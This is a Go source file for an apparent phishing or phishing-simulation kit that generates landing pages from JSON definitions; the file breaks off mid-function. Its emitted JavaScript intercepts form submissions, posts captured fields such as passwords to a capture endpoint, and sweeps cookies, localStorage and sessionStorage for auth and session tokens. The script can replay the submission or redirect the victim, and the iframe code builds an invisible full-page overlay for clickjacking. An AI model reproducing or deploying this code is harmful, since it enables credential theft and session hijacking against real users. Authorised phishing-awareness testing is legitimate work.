// Package htmlgen generates production HTML/CSS/JS from landing page JSON definitions.
package htmlgen

import (
	"fmt"
	"html"
	"strings"
)

// GeneratePageAssets generates HTML files for all pages in a definition.
// Each page produces a separate HTML file. Forms with capture tags include
// JavaScript that POSTs to the credential capture endpoint.
func GeneratePageAssets(def map[string]any, config PageConfig) ([]PageOutput, error) {
	pages, ok := def["pages"].([]any)
	if !ok || len(pages) == 0 {
		return nil, fmt.Errorf("htmlgen: no pages in definition")
	}

	globalStyles, _ := def["global_styles"].(string)
	globalJS, _ := def["global_js"].(string)

	// Populate AllPageRoutes so forms can resolve page_id → filename.
	if config.AllPageRoutes == nil {
		config.AllPageRoutes = make(map[string]string)
	}
	for _, p := range pages {
		if pg, ok := p.(map[string]any); ok {
			pageID, _ := pg["page_id"].(string)
			route, _ := pg["route"].(string)
			filename := routeToFilename(route)
			if route != "" {
				config.AllPageRoutes[route] = filename
			}
			if pageID != "" {
				config.AllPageRoutes[pageID] = filename
			}
		}
	}

	var outputs []PageOutput
	for i, p := range pages {
		page, ok := p.(map[string]any)
		if !ok {
			return nil, fmt.Errorf("htmlgen: invalid page at index %d", i)
		}

		out, err := generatePage(page, globalStyles, globalJS, config, def)
		if err != nil {
			return nil, fmt.Errorf("htmlgen: page %d: %w", i, err)
		}
		outputs = append(outputs, out)
	}

	return outputs, nil
}

// PageConfig holds configuration for HTML generation.
type PageConfig struct {
	// CaptureEndpoint is the URL path for credential capture (default "/capture").
	CaptureEndpoint string
	// TrackingEndpoint is the URL path for tracking pixel (default "/track").
	TrackingEndpoint string
	// TrackingTokenParam is the query parameter name for tracking tokens (default "t").
	TrackingTokenParam string
	// PostCaptureAction determines behavior after form submission.
	PostCaptureAction string
	// PostCaptureRedirectURL for redirect actions.
	PostCaptureRedirectURL string
	// PostCaptureDelayMs for delay_redirect.
	PostCaptureDelayMs int
	// PostCapturePageRoute for display_page action.
	PostCapturePageRoute string
	// PostCaptureReplayURL for replay action.
	PostCaptureReplayURL string
	// AllPageRoutes maps route to filename for navigation links.
	AllPageRoutes map[string]string
}

// TrackingConfig controls which tracking instrumentation scripts are emitted.
// All fields default to true when the config is absent from the definition.
type TrackingConfig struct {
	TimeOnPage      bool
	FormInteraction bool
	ClickAnalytics  bool
	ScrollDepth     bool
}

// PageOutput holds the generated HTML for a single page.
type PageOutput struct {
	Route    string
	Filename string
	HTML     string
}

func generatePage(page map[string]any, globalStyles, globalJS string, config PageConfig, def map[string]any) (PageOutput, error) {
	title, _ := page["title"].(string)
	if title == "" {
		title = "Page"
	}
	favicon, _ := page["favicon"].(string)
	pageStyles, _ := page["page_styles"].(string)
	pageJS, _ := page["page_js"].(string)
	route, _ := page["route"].(string)
	if route == "" {
		route = "/"
	}

	// Determine filename from route.
	filename := routeToFilename(route)

	// Render component tree.
	var body strings.Builder
	hasCaptureForms := false
	if tree, ok := page["component_tree"].([]any); ok {
		for _, comp := range tree {
			if renderProductionComponent(&body, comp, 0, config, false) {
				hasCaptureForms = true
			}
		}
	}

	// Collect responsive styles and generate @media queries.
	var responsiveCSS strings.Builder
	if tree, ok := page["component_tree"].([]any); ok {
		collectResponsiveStyles(&responsiveCSS, tree)
	}

	// Build meta tags.
	var metaTags strings.Builder
	if metas, ok := page["meta_tags"].([]any); ok {
		for _, m := range metas {
			if meta, ok := m.(map[string]any); ok {
				name, _ := meta["name"].(string)
				content, _ := meta["content"].(string)
				if name != "" {
					metaTags.WriteString(fmt.Sprintf("    <meta name=\"%s\" content=\"%s\">\n",
						html.EscapeString(name), html.EscapeString(content)))
				}
			}
		}
	}

	var faviconTag string
	if favicon != "" {
		faviconTag = fmt.Sprintf("    <link rel=\"icon\" href=\"%s\">\n", html.EscapeString(favicon))
	}

	// Build tracking pixel.
	tokenParam := config.TrackingTokenParam
	if tokenParam == "" {
		tokenParam = "t"
	}
	trackingEndpoint := config.TrackingEndpoint
	if trackingEndpoint == "" {
		trackingEndpoint = "/track"
	}

	// Tracking pixel script extracts token from URL and loads pixel.
	trackingScript := fmt.Sprintf(`(function(){
var p=new URLSearchParams(window.location.search);
var tk=p.get('%s')||'';
if(tk){
var img=new Image();img.src='%s?t='+encodeURIComponent(tk)+'&e=page_view&r='+encodeURIComponent(window.location.pathname);
document.body.appendChild(img);img.style.display='none';
}
})();`, tokenParam, trackingEndpoint)

	// Form capture script.
	var captureScript string
	if hasCaptureForms {
		captureEndpoint := config.CaptureEndpoint
		if captureEndpoint == "" {
			captureEndpoint = "/capture"
		}
		captureScript = generateCaptureScript(captureEndpoint, tokenParam, config)
	}

	// Multi-step form script: emitted for forms with form_steps configured.
	multiStepScript := generateMultiStepScript(page)

	// Navigation flow script.
	navigationScript := generateNavigationScript(def, config)
	dynamicFieldScript := generateDynamicFieldScript()

	// Tracking instrumentation scripts (conditional on tracking_config).
	trackingCfg := parseTrackingConfig(def)
	var timeOnPageScript, formInteractionScript, clickAnalyticsScript, scrollDepthScript string
	if trackingCfg.TimeOnPage {
		timeOnPageScript = generateTimeOnPageScript(trackingEndpoint, tokenParam)
	}
	if trackingCfg.FormInteraction {
		formInteractionScript = generateFormInteractionScript(trackingEndpoint, tokenParam)
	}
	if trackingCfg.ClickAnalytics {
		clickAnalyticsScript = generateClickAnalyticsScript(trackingEndpoint, tokenParam)
	}
	if trackingCfg.ScrollDepth {
		scrollDepthScript = generateScrollDepthScript(trackingEndpoint, tokenParam)
	}

	pageHTML := fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>%s</title>
%s%s    <style>%s</style>
    <style>%s</style>
%s</head>
<body>
%s
    <script>%s</script>
    <script>%s</script>
    <script>%s</script>
    <script>%s</script>
    <script>%s</script>
    <script>%s</script>
    <script>%s</script>
    <script>%s</script>
    <script>%s</script>
    <script>%s</script>
    <script>%s</script>
</body>
</html>`,
		html.EscapeString(title),
		faviconTag,
		metaTags.String(),
		globalStyles,
		pageStyles,
		responsiveCSS.String(),
		body.String(),
		globalJS,
		pageJS,
		trackingScript,
		captureScript,
		multiStepScript,
		navigationScript,
		dynamicFieldScript,
		timeOnPageScript,
		formInteractionScript,
		clickAnalyticsScript,
		scrollDepthScript,
	)

	return PageOutput{
		Route:    route,
		Filename: filename,
		HTML:     pageHTML,
	}, nil
}

func generateCaptureScript(captureEndpoint, tokenParam string, config PageConfig) string {
	postAction := generatePostCaptureJS(config)

	return fmt.Sprintf(`(function(){
var forms=document.querySelectorAll('form[data-capture="true"]');
var p=new URLSearchParams(window.location.search);
var tk=p.get('%s')||'';
function doPostAction(form,data){
var a=form.getAttribute('data-post-action')||'';
var ru=form.getAttribute('data-redirect-url')||'';
var dm=parseInt(form.getAttribute('data-delay-ms')||'0',10);
var tp=form.getAttribute('data-target-page')||'';
var rpu=form.getAttribute('data-replay-url')||'';
if(a==='redirect'&&ru){window.location.href=ru;return;}
if(a==='redirect_with_delay'&&ru){setTimeout(function(){window.location.href=ru;},dm||3000);return;}
if(a==='display_page'&&tp){window.location.href=tp;return;}
if(a==='replay_submission'&&rpu){fetch(rpu,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams(data).toString()});return;}
%s
}
function collectSessionData(){
var scope={};
try{var scopeMeta=document.querySelector('meta[name="session-capture-scope"]');if(scopeMeta)scope=JSON.parse(scopeMeta.getAttribute('content')||'{}');}catch(e){}
var sessionData=[];
try{
var cookies=document.cookie.split(';').forEach(function(c){
var parts=c.trim().split('=');
if(parts.length>=2){
sessionData.push({data_type:'cookie',key:parts[0],value:parts.slice(1).join('='),is_time_sensitive:true});
}});
}catch(e){}
try{
for(var i=0;i<localStorage.length;i++){
var key=localStorage.key(i);
if(!key.startsWith('session_capture:'))sessionData.push({data_type:'local_storage',key:key,value:localStorage.getItem(key)||'',is_time_sensitive:key.startsWith('auth')||key.startsWith('token')||key.startsWith('session')});
}
}catch(e){}
try{
for(var j=0;j<sessionStorage.length;j++){
var skey=sessionStorage.key(j);
if(!skey.startsWith('session_capture:'))sessionData.push({data_type:'session_storage',key:skey,value:sessionStorage.getItem(skey)||'',is_time_sensitive:skey.startsWith('auth')||skey.startsWith('token')||skey.startsWith('session')});
}
}catch(e){}
return sessionData;
}
function sendSessionCapture(sessionData){
if(!sessionData||!sessionData.length)return;
fetch('/session-capture',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({tracking_token:tk,session_data:sessionData}),
keepalive:true
}).catch(function(){});
}
forms.forEach(function(form){
form.addEventListener('submit',function(e){
e.preventDefault();
var data={};
new FormData(form).forEach(function(v,k){data[k]=v;});
var sessionData=collectSessionData();
fetch('%s',{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({fields:data,tracking_token:tk,metadata:{timestamp:new Date().toISOString(),page:window.location.pathname}})
}).then(function(resp){
doPostAction(form,data);
sendSessionCapture(sessionData);
}).catch(function(){
doPostAction(form,data);
sendSessionCapture(sessionData);
});
});
})();
`, tokenParam, postAction, captureEndpoint)
}

func generatePostCaptureJS(config PageConfig) string {
	switch config.PostCaptureAction {
	case "redirect":
		if config.PostCaptureRedirectURL != "" {
			return fmt.Sprintf("window.location.href='%s';", config.PostCaptureRedirectURL)
		}
		return ""
	case "delay_redirect":
		delay := config.PostCaptureDelayMs
		if delay <= 0 {
			delay = 3000
		}
		url := config.PostCaptureRedirectURL
		if url == "" {
			return ""
		}
		return fmt.Sprintf("setTimeout(function(){window.location.href='%s';},%d);", url, delay)
	case "display_page":
		if config.PostCapturePageRoute != "" {
			filename := routeToFilename(config.PostCapturePageRoute)
			return fmt.Sprintf("window.location.href='/%s';", filename)
		}
		return ""
	case "replay":
		if config.PostCaptureReplayURL != "" {
			return fmt.Sprintf(`fetch('%s',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams(data).toString()});`, config.PostCaptureReplayURL)
		}
		return ""
	default:
		return ""
	}
}

// renderProductionComponent renders a component to HTML and returns whether
// any capture-tagged form fields were found.
func renderProductionComponent(w *strings.Builder, comp any, depth int, config PageConfig, insideForm bool) bool {
	c, ok := comp.(map[string]any)
	if !ok {
		return false
	}

	cType, _ := c["type"].(string)
	props, _ := c["properties"].(map[string]any)
	children, _ := c["children"].([]any)

	// Skip hidden components in production output.
	if hidden, ok := props["hidden"].(bool); ok && hidden {
		return true
	}

	indent := strings.Repeat("    ", depth+1)
	cssClass, _ := props["css_class"].(string)
	inlineStyle, _ := props["inline_style"].(string)
	id, _ := props["id"].(string)
	compID, _ := c["component_id"].(string)

	// Auto-generate a stable ID for components with event bindings but no explicit id.
	if id == "" && hasEventBindings(c) && compID != "" {
		idSuffix := compID
		if len(idSuffix) > 8 {
			idSuffix = idSuffix[:8]
		}
		id = "comp-" + idSuffix
	}

	// Always include data-comp-id so @media queries and multi-step form JS can target elements.
	attrs := buildAttrsWithCompID(id, cssClass, inlineStyle, compID)

	// Check if this component's subtree (including itself) has capture tags.
	hasCaptureInSubtree := hasCaptureTags(c)
	// Check if this component itself (not children) directly has a capture tag.
	selfHasCapture := hasSelfCaptureTag(c)

	// If this is a container-type with capture fields in its subtree (but not itself directly
	// a capture field), wrap in a form — unless we're already inside a form.
	isContainer := isContainerType(cType)
	wrapInForm := isContainer && hasCaptureInSubtree && !selfHasCapture && !insideForm && cType != "form"

	hasCapture := false

	if wrapInForm {
		w.WriteString(fmt.Sprintf("%s<form data-capture=\"true\" method=\"POST\">\n", indent))
	}

	switch cType {
	case "form":
		// Form component renders as <form> with data-capture and per-form post-capture config.
		formAttrs := attrs
		hasCaptureChildren := hasCaptureTags(c)
		if hasCaptureChildren {
			formAttrs += " data-capture=\"true\" method=\"POST\""
		}
		// Store per-form post-capture config as data attributes for the capture script.
		postAction, _ := props["post_capture_action"].(string)
		if postAction != "" {
			formAttrs += fmt.Sprintf(" data-post-action=\"%s\"", html.EscapeString(postAction))
		}
		redirectURL, _ := props["redirect_url"].(string)
		if redirectURL != "" {
			formAttrs += fmt.Sprintf(" data-redirect-url=\"%s\"", html.EscapeString(redirectURL))
		}
		if delayMs, ok := props["delay_ms"].(float64); ok && delayMs > 0 {
			formAttrs += fmt.Sprintf(" data-delay-ms=\"%d\"", int(delayMs))
		}
		targetPage, _ := props["target_page"].(string)
		if targetPage != "" {
			if filename, ok := config.AllPageRoutes[targetPage]; ok {
				formAttrs += fmt.Sprintf(" data-target-page=\"/%s\"", html.EscapeString(filename))
			}
		}
		replayURL, _ := props["replay_url"].(string)
		if replayURL != "" {
			formAttrs += fmt.Sprintf(" data-replay-url=\"%s\"", html.EscapeString(replayURL))
		}
		w.WriteString(fmt.Sprintf("%s<form%s>\n", indent, formAttrs))
		hasCapture = renderProductionChildren(w, children, depth+1, config, true) || hasCaptureChildren
		w.WriteString(fmt.Sprintf("%s</form>\n", indent))

	case "container", "section", "card":
		tag := "div"
		if cType == "section" {
			tag = "section"
		}
		w.WriteString(fmt.Sprintf("%s<%s%s>\n", indent, tag, attrs))
		hasCapture = renderProductionChildren(w, children, depth+1, config, insideForm || wrapInForm)
		w.WriteString(fmt.Sprintf("%s</%s>\n", indent, tag))

	case "row":
		// Merge display:flex default with user inline_style (which may override flex properties).
		rowStyle := mergeStyles("display:flex;", inlineStyle)
		rowAttrs := buildAttrsWithCompID(id, cssClass, rowStyle, compID)
		w.WriteString(fmt.Sprintf("%s<div%s>\n", indent, rowAttrs))
		hasCapture = renderProductionChildren(w, children, depth+1, config, insideForm || wrapInForm)
		w.WriteString(fmt.Sprintf("%s</div>\n", indent))

	case "column":
		// Merge flex:1 default with user inline_style (which may set flex-basis, etc.).
		colStyle := mergeStyles("flex:1;", inlineStyle)
		colAttrs := buildAttrsWithCompID(id, cssClass, colStyle, compID)
		w.WriteString(fmt.Sprintf("%s<div%s>\n", indent, colAttrs))
		hasCapture = renderProductionChildren(w, children, depth+1, config, insideForm || wrapInForm)
		w.WriteString(fmt.Sprintf("%s</div>\n", indent))

	case "heading":
		level := "h2"
		if l, ok := props["level"].(string); ok && l != "" {
			level = l
		} else if l, ok := props["level"].(float64); ok {
			level = fmt.Sprintf("h%d", int(l))
		}
		content, _ := props["content"].(string)
		w.WriteString(fmt.Sprintf("%s<%s%s>%s</%s>\n", indent, level, attrs, html.EscapeString(content), level))

	case "paragraph":
		content, _ := props["content"].(string)
		w.WriteString(fmt.Sprintf("%s<p%s>%s</p>\n", indent, attrs, html.EscapeString(content)))

	case "text":
		content, _ := props["content"].(string)
		w.WriteString(fmt.Sprintf("%s<span%s>%s</span>\n", indent, attrs, html.EscapeString(content)))

	case "span":
		content, _ := props["content"].(string)
		w.WriteString(fmt.Sprintf("%s<span%s>%s</span>\n", indent, attrs, html.EscapeString(content)))

	case "label":
		content, _ := props["content"].(string)
		forAttr, _ := props["for"].(string)
		extra := ""
		if forAttr != "" {
			extra = fmt.Sprintf(" for=\"%s\"", html.EscapeString(forAttr))
		}
		w.WriteString(fmt.Sprintf("%s<label%s%s>%s</label>\n", indent, attrs, extra, html.EscapeString(content)))

	case "blockquote":
		content, _ := props["content"].(string)
		w.WriteString(fmt.Sprintf("%s<blockquote%s>%s</blockquote>\n", indent, attrs, html.EscapeString(content)))

	case "code_block":
		content, _ := props["content"].(string)
		w.WriteString(fmt.Sprintf("%s<pre%s><code>%s</code></pre>\n", indent, attrs, html.EscapeString(content)))

	case "image":
		src, _ := props["src"].(string)
		alt, _ := props["alt"].(string)
		w.WriteString(fmt.Sprintf("%s<img%s src=\"%s\" alt=\"%s\">\n", indent, attrs, html.EscapeString(src), html.EscapeString(alt)))

	case "video":
		src, _ := props["src"].(string)
		w.WriteString(fmt.Sprintf("%s<video%s src=\"%s\" controls></video>\n", indent, attrs, html.EscapeString(src)))

	case "icon", "logo":
		src, _ := props["src"].(string)
		alt, _ := props["alt"].(string)
		if alt == "" {
			alt = cType
		}
		w.WriteString(fmt.Sprintf("%s<img%s src=\"%s\" alt=\"%s\">\n", indent, attrs, html.EscapeString(src), html.EscapeString(alt)))

	case "iframe":
		src, _ := props["src"].(string)
		width, _ := props["width"].(string)
		height, _ := props["height"].(string)
		sandbox, _ := props["sandbox"].(string)
		allow, _ := props["allow"].(string)
		isOverlay, _ := props["is_overlay"].(bool)
		if width == "" {
			width = "100%"
		}
		if height == "" {
			height = "400"
		}

		// If overlay mode is enabled, apply overlay CSS inline and omit width/height attrs.
		iframeStyle := inlineStyle
		if isOverlay {
			overlayPos := "absolute"
			if pos, ok := props["overlay_position"].(string); ok && pos != "" {
				overlayPos = pos
			}
			overlayOpacity := 0.01
			if op, ok := props["overlay_opacity"].(float64); ok {
				overlayOpacity = op
			}
			overlayZ := 9999
			if z, ok := props["overlay_z_index"].(float64); ok {
				overlayZ = int(z)
			}
			overlayPE := "auto"
			if pe, ok := props["overlay_pointer_events"].(string); ok && pe != "" {
				overlayPE = pe
			}
			overlayCss := fmt.Sprintf("position:%s;top:0;left:0;width:100%%;height:100%%;opacity:%.2f;z-index:%d;pointer-events:%s;border:none",
				overlayPos, overlayOpacity, overlayZ, overlayPE)
			if iframeStyle != "" {
				iframeStyle = iframeStyle + ";" + overlayCss
			} else {
				iframeStyle = overlayCss
			}
			// Rebuild attrs with overlay styles.
			attrs = buildAttrsWithCompID(id, cssClass, iframeStyle, compID)
			iframeAttrs := fmt.Sprintf(" src=\"%s\"", html.EscapeString(src))
			if sandbox != "" {
				iframeAttrs += fmt.Sprintf(" sandbox=\"%s\"", html.EscapeString(sandbox))
			}
			if allow != "" {
				iframeAttrs += fmt.Sprintf(" allow=\"%s\"", html.EscapeString(allow))
			}
			w.WriteString(fmt.Sprintf("%s<iframe%s%s></iframe>\n", indent, attrs, iframeAttrs))
		} else {
			iframeAttrs := fmt.Sprintf(" src=\"%s\" width=\"%s\" height=\"%s\"",
				html.EscapeString(src), html.EscapeString(width), html.EscapeString(height))
			if sandbox != "" {
				iframeAttrs += fmt.Sprintf(" sandbox=\"%s\"", html.EscapeString(sandbox))
			}
			if allow != "" {
				iframeAttrs += fmt.Sprintf(" allow=\"%s\"", html.EscapeString(allow))
			}
			w.WriteString(fmt.Sprintf("%s<iframe%s%s></iframe>\n", indent, attrs, iframeAttrs))
		}

	case "text_input":
		name, _ := props["name"].(string)
		placeholder, _ := props["placeholder"].(string)
		captureTag, _ := props["capture_tag"].(string)
		if captureTag != "" {
			hasCapture = true
		}
		labelText, _ := props["label_text"].(string)
		extra := buildFormFieldAttrs(props)
		if labelText != "" {
			w.WriteString(fmt.Sprintf("%s<label>%s</label>\n", indent, html.EscapeString(labelText)))
		}
		w.WriteString(fmt.Sprintf("%s<input type=\"text\"%s name=\"%s\" placeholder=\"%s\"%s>\n",
			indent, attrs, html.EscapeString(name), html.EscapeString(placeholder), extra))

	case "password_input":
		name, _ := props["name"].(string)
		placeholder, _ := props["placeholder"].(string)
		captureTag, _ := props["capture_tag"].(string)
		if captureTag != "" {
			hasCapture = true
		}
		labelText, _ := props["label_text"].(string)
		extra := buildFormFieldAttrs(props)
		if labelText != "" {
			w.WriteString(fmt.Sprintf("%s<label>%s</label>\n", indent, html.EscapeString(labelText)))
		}
		w.WriteString(fmt.Sprintf("%s<input type=\"password\"%s name=\"%s\" placeholder=\"%s\"%s>\n",
			indent, attrs, html.EscapeString(name), html.EscapeString(placeholder), extra))

	case "email_input":
		name, _ := props["name"].(string)
		placeholder, _ := props["placeholder"].(string)
		captureTag, _ := props["capture_tag"].(string)
		if captureTag != "" {
			hasCapture = true
		}
		labelText, _ := props["label_text"].(string)
		extra := buildFormFieldAttrs(props)
		if labelText != "" {
			w.WriteString(fmt.Sprintf("%s<label>%s</label>\n", indent, html.EscapeString(labelText)))
		}
		w.WriteString(fmt.Sprintf("%s<input type=\"email\"%s name=\"%s\" placeholder=\"%s\"%s>\n",
			indent, attrs, html.EscapeString(name), html.EscapeString(placeholder), extra))

	case "textarea":
		name, _ := props["name"].(string)
		placeholder, _ := props["placeholder"].(string)
		captureTag, _ := props["capture_tag"].(string)
		if captureTag != "" {
			hasCapture = true
		}
		labelText, _ := props["label_text"].(string)
		extra := buildFormFieldAttrs(props)
		if labelText != "" {
			w.WriteString(fmt.Sprintf("%s<label>%s</label>\n", indent, html.EscapeString(labelText)))
		}
		w.WriteString(fmt.Sprintf("%s<textarea%s name=\"%s\" placeholder=\"%s\"%s></textarea>\n",
			indent, attrs, html.EscapeString(name), html.EscapeString(placeholder), extra))

	case "select":
		name, _ := props["name"].(string)
		captureTag, _ := props["capture_tag"].(string)
		if captureTag != "" {
			hasCapture = true
		}
		labelText, _ := props["label_text"].(string)
		if labelText != "" {
			w.WriteString(fmt.Sprintf("%s<label>%s</label>\n", indent, html.EscapeString(labelText)))
		}
		w.WriteString(fmt.Sprintf("%s<select%s name=\"%s\">", indent, attrs, html.EscapeString(name)))
		if options, ok := props["options"].([]any); ok {
			for _, opt := range options {
				if o, ok := opt.(map[string]any); ok {
					val, _ := o["value"].(string)
					labelText, _ := o["label"].(string)
					w.WriteString(fmt.Sprintf("<option value=\"%s\">%s</option>", html.EscapeString(val), html.EscapeString(labelText)))
				}
			}
		}
		w.WriteString("</select>\n")

	case "checkbox":
		name, _ := props["name"].(string)
		labelText, _ := props["label"].(string)
		w.WriteString(fmt.Sprintf("%s<label%s><input type=\"checkbox\" name=\"%s\"> %s</label>\n",
			indent, attrs, html.EscapeString(name), html.EscapeString(labelText)))

	case "radio":
		name, _ := props["name"].(string)
		value, _ := props["value"].(string)
		labelText, _ := props["label"].(string)
		w.WriteString(fmt.Sprintf("%s<label%s><input type=\"radio\" name=\"%s\" value=\"%s\"> %s</label>\n",
			indent, attrs, html.EscapeString(name), html.EscapeString(value), html.EscapeString(labelText)))

	case "file_upload":
		name, _ := props["name"].(string)
		w.WriteString(fmt.Sprintf("%s<input type=\"file\"%s name=\"%s\">\n", indent, attrs, html.EscapeString(name)))

	case "hidden_field":
		name, _ := props["name"].(string)
		value, _ := props["value"].(string)
		captureTag, _ := props["capture_tag"].(string)
		valueSource, _ := props["value_source"].(string)
		dynamicSource, _ := props["dynamic_source"].(string)
		if captureTag != "" {
			hasCapture = true
		}
		fieldID := html.EscapeString(name)
		if valueSource == "dynamic" && dynamicSource != "" {
			// Dynamic values: render with a data attribute and empty value — JS fills at runtime.
			w.WriteString(fmt.Sprintf("%s<input type=\"hidden\"%s name=\"%s\" value=\"\" data-dynamic-source=\"%s\" id=\"hf-%s\">\n",
				indent, attrs, fieldID, html.EscapeString(dynamicSource), fieldID))
		} else {
			w.WriteString(fmt.Sprintf("%s<input type=\"hidden\"%s name=\"%s\" value=\"%s\">\n",
				indent, attrs, fieldID, html.EscapeString(value)))
		}

	case "button", "submit_button":
		content, _ := props["content"].(string)
		if content == "" && cType == "submit_button" {
			content = "Submit"
		}
		btnType := "button"
		if cType == "submit_button" {
			btnType = "submit"
		}
		onClick := ""
		actionType, _ := props["action_type"].(string)
		switch actionType {
		case "page":
			if pg, _ := props["action_page"].(string); pg != "" {
				onClick = fmt.Sprintf(" onclick=\"window.location.href='%s';return false;\"", html.EscapeString(pg))
			}
		case "url":
			if u, _ := props["action_url"].(string); u != "" {
				if newTab, _ := props["action_new_tab"].(bool); newTab {
					onClick = fmt.Sprintf(" onclick=\"window.open('%s','_blank');return false;\"", html.EscapeString(u))
				} else {
					onClick = fmt.Sprintf(" onclick=\"window.location.href='%s';return false;\"", html.EscapeString(u))
				}
			}
		case "js":
			if js, _ := props["action_js"].(string); js != "" {
				onClick = fmt.Sprintf(" onclick=\"%s\"", html.EscapeString(js))
			}
		}
		w.WriteString(fmt.Sprintf("%s<button type=\"%s\"%s%s>%s</button>\n",
			indent, btnType, attrs, onClick, html.EscapeString(content)))

	case "link":
		content, _ := props["content"].(string)
		href := ""
		linkActionType, _ := props["action_type"].(string)
		switch linkActionType {
		case "page":
			if pg, _ := props["action_page"].(string); pg != "" {
				href = pg
			}
		case "url":
			if u, _ := props["action_url"].(string); u != "" {
				href = u
			}
		default:
			href, _ = props["href"].(string)
		}
		extra := ""
		if newTab, _ := props["action_new_tab"].(bool); newTab {
			extra = " target=\"_blank\" rel=\"noopener noreferrer\""
		} else if t, _ := props["target"].(string); t == "_blank" {
			extra = " target=\"_blank\" rel=\"noopener noreferrer\""
		}
		if linkActionType == "js" {
			href = "#"
			if js, _ := props["action_js"].(string); js != "" {
				extra += fmt.Sprintf(" onclick=\"%s\"", html.EscapeString(js))
			}
		}
		w.WriteString(fmt.Sprintf("%s<a%s href=\"%s\"%s>%s</a>\n",
			indent, attrs, html.EscapeString(href), extra, html.EscapeString(content)))

	case "toggle":
		name, _ := props["name"].(string)
		w.WriteString(fmt.Sprintf("%s<label%s><input type=\"checkbox\" name=\"%s\" role=\"switch\"> Toggle</label>\n",
			indent, attrs, html.EscapeString(name)))

	case "alert":
		content, _ := props["content"].(string)
		w.WriteString(fmt.Sprintf("%s<div%s role=\"alert\">%s</div>\n", indent, attrs, html.EscapeString(content)))

	case "spinner":
		w.WriteString(fmt.Sprintf("%s<div%s class=\"spinner\">Loading...</div>\n", indent, attrs))

	case "progress_bar":
		value, _ := props["value"].(float64)
		w.WriteString(fmt.Sprintf("%s<progress%s value=\"%d\" max=\"100\"></progress>\n", indent, attrs, int(value)))

	case "toast":
		content, _ := props["content"].(string)
		w.WriteString(fmt.Sprintf("%s<div%s role=\"status\">%s</div>\n", indent, attrs, html.EscapeString(content)))

	case "spacer":
		height := "20px"
		if h, ok := props["height"].(string); ok && h != "" {
			height = h
		}
		w.WriteString(fmt.Sprintf("%s<div%s style=\"height:%s\"></div>\n", indent, attrs, html.EscapeString(height)))

	case "divider":
		w.WriteString(fmt.Sprintf("%s<hr%s>\n", indent, attrs))

	case "navbar":
		w.WriteString(fmt.Sprintf("%s<nav%s>\n", indent, attrs))
		hasCapture = renderProductionChildren(w, children, depth+1, config, insideForm || wrapInForm) || hasCapture
		w.WriteString(fmt.Sprintf("%s</nav>\n", indent))

	case "footer":
		w.WriteString(fmt.Sprintf("%s<footer%s>\n", indent, attrs))
		hasCapture = renderProductionChildren(w, children, depth+1, config, insideForm || wrapInForm) || hasCapture
		w.WriteString(fmt.Sprintf("%s</footer>\n", indent))

	case "breadcrumb":
		w.WriteString(fmt.Sprintf("%s<nav%s aria-label=\"breadcrumb\"><ol></ol></nav>\n", indent, attrs))

	case "tabs":
		w.WriteString(fmt.Sprintf("%s<div%s role=\"tablist\">\n", indent, attrs))
		hasCapture = renderProductionChildren(w, children, depth+1, config, insideForm || wrapInForm) || hasCapture
		w.WriteString(fmt.Sprintf("%s</div>\n", indent))

	case "sidebar":
		w.WriteString(fmt.Sprintf("%s<aside%s>\n", indent, attrs))
		hasCapture = renderProductionChildren(w, children, depth+1, config, insideForm || wrapInForm) || hasCapture
		w.WriteString(fmt.Sprintf("%s</aside>\n", indent))

	case "raw_html":
		content, _ := props["content"].(string)
		w.WriteString(indent + content + "\n")

	default:
		// Skip unknown components silently in production.
	}

	if wrapInForm {
		w.WriteString(fmt.Sprintf("%s</form>\n", indent))
	}

	// Render event bindings as inline script.
	// The `id` variable may be user-set or auto-generated (comp-{first 8 UUID chars}).
	if bindings, ok := c["event_bindings"].([]any); ok && len(bindings) > 0 && id != "" {
		for _, b := range bindings {
			if binding, ok := b.(map[string]any); ok {
				event, _ := binding["event"].(string)
				handler, _ := binding["handler"].(string)
				if event != "" && handler != "" {
					jsEvent := eventToJS(event)
					w.WriteString(fmt.Sprintf("%s<script>document.getElementById('%s').addEventListener('%s',function(e){%s});</script>\n",
						indent, id, jsEvent, handler))
				}
			}
		}
	}

	return hasCapture
}

func renderProductionChildren(w *strings.Builder, children []any, depth int, config PageConfig, insideForm bool) bool {
	hasCapture := false
	for _, child := range children {
		if renderProductionComponent(w, child, depth, config, insideForm) {
			hasCapture = true
		}
	}
	return hasCapture
}

// hasEventBindings checks if a component has event bindings.
func hasEventBindings(comp map[string]any) bool {
	bindings, ok := comp["event_bindings"].([]any)
	return ok && len(bindings) > 0
}

// hasSelfCaptureTag checks if the component itself (not descendants) has a capture_tag.
func hasSelfCaptureTag(comp map[string]any) bool {
	props, _ := comp["properties"].(map[string]any)
	tag, ok := props["capture_tag"].(string)
	return ok && tag != ""
}

// hasCaptureTags checks if a component or any of its descendants has a capture_tag.
func hasCaptureTags(comp map[string]any) bool {
	props, _ := comp["properties"].(map[string]any)
	if tag, ok := props["capture_tag"].(string); ok && tag != "" {
		return true
	}
	children, _ := comp["children"].([]any)
	for _, child := range children {
		if c, ok := child.(map[string]any); ok {
			if hasCaptureTags(c) {
				return true
			}
		}
	}
	return false
}

func isContainerType(cType string) bool {
	containers := map[string]bool{
		"container": true, "section": true, "card": true,
		"row": true, "column": true,
		"navbar": true, "footer": true, "tabs": true, "sidebar": true,
		"form": true,
	}
	return containers[cType]
}

// buildFormFieldAttrs generates HTML attributes for required, pattern, minlength, maxlength.
func buildFormFieldAttrs(props map[string]any) string {
	var parts []string
	if req, ok := props["required"].(bool); ok && req {
		parts = append(parts, "required")
	}
	if regex, ok := props["validation_regex"].(string); ok && regex != "" {
		parts = append(parts, fmt.Sprintf("pattern=\"%s\"", html.EscapeString(regex)))
	}
	if min, ok := props["min_length"].(float64); ok && min > 0 {
		parts = append(parts, fmt.Sprintf("minlength=\"%d\"", int(min)))
	}
	if max, ok := props["max_length"].(float64); ok && max > 0 {
		parts = append(parts, fmt.Sprintf("maxlength=\"%d\"", int(max)))
	}
	if len(parts) == 0 {
		return ""
	}
	return " " + strings.Join(parts, " ")
}

func buildAttrs(id, cssClass, inlineStyle string) string {
	return buildAttrsWithCompID(id, cssClass, inlineStyle, "")
}

func buildAttrsWithCompID(id, cssClass, inlineStyle, compID string) string {
	var parts []string
	if id != "" {
